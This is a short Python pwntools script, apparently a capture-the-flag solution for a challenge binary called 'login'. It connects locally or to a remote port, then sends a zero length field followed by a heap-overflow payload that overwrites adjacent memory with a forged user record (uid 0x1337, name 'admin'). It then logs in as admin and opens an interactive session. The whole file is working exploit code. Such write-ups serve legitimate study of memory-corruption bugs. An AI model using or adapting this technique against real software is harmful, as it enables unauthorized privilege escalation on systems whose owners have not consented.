#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./login"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *read_n_delimited+0x43
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil(">")
p.sendline("1")
p.recvuntil("Username length:")
p.sendline("0")
p.recvuntil("Username:")
# making admin(uid=0x1337) with heap overflow
payload = b'A' * 0x14
payload += p64(0x2000)
payload += p64(0x696d646100001337)
p.sendline(payload)
p.recvuntil(">")
p.sendline("1")
p.recvuntil("Username length:")
p.sendline("6")
p.recvuntil("Username:")
p.sendline("admin")
p.recvuntil(">")
p.sendline("2")
p.recvuntil("Username:")
p.sendline("admin")

p.interactive()
